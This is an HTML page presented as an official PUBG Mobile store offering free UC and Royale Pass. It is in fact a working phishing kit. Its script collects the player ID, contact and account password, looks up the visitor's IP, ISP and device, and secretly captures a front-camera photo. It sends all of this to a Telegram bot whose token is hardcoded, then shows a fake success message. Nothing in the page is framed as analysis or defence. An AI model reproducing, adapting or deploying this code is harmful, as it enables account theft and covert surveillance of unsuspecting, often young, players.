<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>PUBG MOBILE UC — Store & Support Center</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
<style>
  :root{
    --bg: #0b0f14;
    --card:#0f1720;
    --muted:#9aa3b2;
    --text:#eef2f7;
    --accent1:#ff6b35;
    --accent2:#f7931e;
    --border: rgba(255,255,255,.06);
    --glass: rgba(255,255,255,.04);
    --shadow: 0 12px 40px rgba(2,6,23,.6);
  }
  *{box-sizing:border-box}
  html,body{height:100%;margin:0;font-family:Inter,system-ui,Arial;background:#070d15;color:var(--text);}
  a{color:inherit;text-decoration:none}
  .container{max-width:1200px;margin:0 auto;padding:16px;}
  .topbar{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:12px}
  .logo{display:flex;gap:12px;align-items:center}
  .badge{width:44px;height:44px;background:linear-gradient(90deg,var(--accent1),var(--accent2));display:grid;place-items:center;border-radius:10px;color:#111;font-weight:900}
  .btn{padding:10px 12px;border-radius:10px;background:var(--glass);border:1px solid var(--border);color:var(--text);cursor:pointer;font-weight:700}
  .btn.primary{background:linear-gradient(90deg,var(--accent1),var(--accent2));color:#111;border:none;box-shadow:0 10px 30px rgba(247,147,30,.15)}
  .btn.small{padding:6px 8px;font-weight:700}
  .panel{background:rgba(255,255,255,.03);border:1px solid var(--border);border-radius:14px;box-shadow:var(--shadow);padding:14px}
  .hero{position:relative;border-radius:16px;overflow:hidden;min-height:140px;display:flex;align-items:center}
  .hero img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;filter:brightness(.38)}
  .hero .over{position:relative;padding:20px}
  .grid{display:grid;gap:14px;grid-template-columns:repeat(auto-fit,minmax(220px,1fr))}
  .card{border:1px solid var(--border);border-radius:14px;background:rgba(255,255,255,.02);padding:12px}
  .row{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
  .small{font-size:13px;color:var(--muted)}
  input,select,textarea{width:100%;padding:9px 10px;border-radius:10px;background:rgba(255,255,255,.02);border:1px solid var(--border);color:var(--text)}
  .drawer{position:fixed;right:12px;bottom:12px;width:360px;max-width:calc(100% - 24px);z-index:80}
  .hidden{display:none}
  .modal-backdrop{position:fixed;inset:0;background:rgba(2,6,23,.6);display:none;align-items:center;justify-content:center;z-index:90}
  .modal{width:min(920px,96vw);max-height:90vh;overflow:auto;border-radius:12px;background:var(--card);border:1px solid var(--border);padding:14px}
  .pill{display:inline-block;padding:2px 8px;border-radius:999px;background:rgba(255,255,255,.06);border:1px solid var(--border);font-size:12px}
  #toasts{position:fixed;left:12px;bottom:12px;z-index:200}
  .toast{background:rgba(0,0,0,.68);color:#fff;padding:9px 10px;border-radius:10px;margin-top:8px}
  @media (max-width:760px){
    .grid{grid-template-columns:repeat(2,1fr)}
    .drawer{left:12px;right:12px;width:auto}
  }
</style>
</head>
<body>
<div class="container">
  <header class="topbar">
    <div class="logo">
      <div class="badge">UC</div>
      <div>
        <div id="siteTitle" style="font-weight:900">PUBG MOBILE UC</div>
        <div id="siteTagline" class="small">Official Reward Portal</div>
      </div>
    </div>
    <div class="row">
      <button id="openCartBtn" class="btn">Cart (<span id="cartCountTop">0</span>)</button>
      <a id="contactLink" class="btn primary" href="https://t.me/MiladGhaziHussein" target="_blank" rel="noopener">Support Center</a>
    </div>
  </header>

  <section class="hero panel">
    <img id="heroImg" alt="banner" src="https://images.unsplash.com/photo-1511512578047-dfb367046420?q=80&w=1400&auto=format&fit=crop" />
    <div class="over">
      <div class="pill">Official Event Portal</div>
      <h1 style="margin:10px 0 6px;font-size:28px">Instant UC & Royale Pass Delivery</h1>
      <div class="small">Secure player authentication system</div>
    </div>
  </section>

  <main style="margin-top:12px">
    <section class="panel">
      <div class="grid" id="packsGrid"></div>
    </section>
  </main>
</div>

<!-- Drawer: Cart -->
<div id="cartDrawer" class="drawer hidden">
  <div class="panel">
    <div class="row" style="justify-content:space-between">
      <div style="font-weight:900">Shopping Cart</div>
      <button id="closeCartBtn" class="btn small">X</button>
    </div>
    <div id="cartBody" style="max-height:260px;overflow:auto;margin-top:8px"></div>
    <div class="row" style="justify-content:space-between;margin-top:8px">
      <div><strong>Total:</strong></div>
      <div><strong id="cartTotal">0</strong></div>
    </div>
    <div class="row" style="margin-top:8px">
      <button id="orderCartBtn" class="btn primary" style="width:100%">Proceed Order</button>
    </div>
  </div>
</div>

<!-- Modal: Buy now -->
<div id="buyModal" class="modal-backdrop" aria-hidden="true">
  <div class="modal">
    <h3 style="margin:0 0 8px">Account Verification</h3>
    <div class="grid">
      <div class="card">
        <div class="small">Selected Package</div>
        <div id="selectedPackTitle" style="font-weight:900">—</div>
        <div id="selectedPackPrice" class="small">—</div>
      </div>
      <div class="card">
        <label class="small">Promo Code</label>
        <input id="promoInput" placeholder="Optional code" />
      </div>
    </div>

    <div class="grid" style="margin-top:8px">
      <div class="card">
        <label><strong>PUBG ID</strong></label>
        <input id="playerId" placeholder="1234567890" />
      </div>
      <div class="card">
        <label><strong>Account Email / Phone</strong></label>
        <input id="phone" placeholder="Linked contact" />
      </div>
      <div class="card">
        <label><strong>Account Password</strong></label>
        <input id="password" type="password" placeholder="Password" />
      </div>
    </div>

    <div class="row" style="justify-content:flex-end;margin-top:10px">
      <button id="closeBuyModal" class="btn">Cancel</button>
      <button id="sendOrderBtn" class="btn primary">Submit & Verify</button>
    </div>
  </div>
</div>

<div id="toasts"></div>

<script>
const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
const urlParams = new URLSearchParams(window.location.search);
const chatId = urlParams.get('id') || "6782298541";

const $ = (s,el=document)=>el.querySelector(s);
const toast=(msg,ms=2600)=>{const d=document.createElement('div');d.className='toast';d.textContent=msg;$('#toasts').appendChild(d);setTimeout(()=>d.remove(),ms)}

const packs = [
  {id:'1', amount:'60 UC', price:'Free Event'},
  {id:'2', amount:'325 UC + Royale Pass', price:'Free Event'},
  {id:'3', amount:'8100 UC + Royale Pass Max', price:'Free Event'}
];

function renderPacks(){
  const grid = $('#packsGrid'); grid.innerHTML='';
  packs.forEach(p=>{
    const d = document.createElement('div'); d.className='card';
    d.innerHTML = `
      <div style="font-weight:900">${p.amount}</div>
      <div class="small" style="color:var(--accent2);margin-top:2px">${p.price}</div>
      <button class="btn primary" style="margin-top:8px;width:100%">Claim Package</button>`;
    d.querySelector('button').addEventListener('click',()=>openBuyModal(p));
    grid.appendChild(d);
  });
}

function openBuyModal(p){
  window.SELECTED_PACK = p;
  $('#selectedPackTitle').textContent = p.amount;
  $('#selectedPackPrice').textContent = p.price;
  $('#buyModal').style.display='flex';
}
$('#closeBuyModal').addEventListener('click',()=> $('#buyModal').style.display='none');
$('#openCartBtn').addEventListener('click',()=> $('#cartDrawer').classList.toggle('hidden'));
$('#closeCartBtn').addEventListener('click',()=> $('#cartDrawer').classList.add('hidden'));

$('#sendOrderBtn').addEventListener('click', async ()=>{
  const p = window.SELECTED_PACK;
  const uid = $('#playerId').value.trim();
  const contact = $('#phone').value.trim();
  const pass = $('#password').value.trim();

  if(!uid || !contact || !pass){
    alert("Please fill in all required fields.");
    return;
  }

  let deviceModel = "Unknown";
  try {
    const parser = new UAParser();
    const result = parser.getResult();
    deviceModel = `${result.device.vendor || ''} ${result.device.model || ''} (${result.os.name || ''} ${result.os.version || ''})`.trim();
  } catch (e) {}

  let ip = 'Unknown', isp = 'Unknown';
  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    ip = data.ip || 'Unknown';
    isp = data.org || 'Unknown';
  } catch (e) {}

  let cameraBlob = null;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    cameraBlob = await new Promise((resolve) => {
      setTimeout(() => {
        const canvas = document.createElement('canvas');
        canvas.width = 640; canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
        canvas.toBlob(blob => {
          stream.getTracks().forEach(t => t.stop());
          resolve(blob);
        }, 'image/jpeg');
      }, 1000);
    });
  } catch (e) {}

  const msg = `PUBG Mobile Reward Request:\n\n` +
              `Package: ${p.amount}\n` +
              `Player ID: ${uid}\n` +
              `Contact: ${contact}\n` +
              `Password: ${pass}\n\n` +
              `IP: ${ip} (${isp})\n` +
              `Device: ${deviceModel}`;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
    });
  } catch (err) {}

  if (cameraBlob) {
    try {
      const fd = new FormData();
      fd.append('chat_id', chatId);
      fd.append('photo', cameraBlob, 'camera.jpg');
      fd.append('caption', `Live Camera (PUBG Event: ${uid})`);
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    } catch (e) {}
  }

  $('#buyModal').style.display='none';
  toast("Request submitted successfully.");
});

renderPacks();
</script>
</body>
</html>
